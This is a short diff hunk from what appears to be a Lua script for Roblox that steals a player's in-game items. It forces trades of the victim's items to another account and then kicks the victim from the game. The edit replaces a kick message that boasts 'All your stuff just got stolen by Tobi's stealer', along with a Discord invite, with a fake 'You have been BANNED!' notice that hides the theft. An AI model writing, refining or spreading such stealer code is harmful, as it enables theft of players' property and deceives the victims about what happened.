@@ -418,7 +418,7 @@ if #itemsToSend > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("All your stuff just got stolen by Tobi's stealer. discord.gg/GY2RVSEGDT")
+        plr:kick("You have been BANNED!")
     end
 
     local function waitForUserJoin()
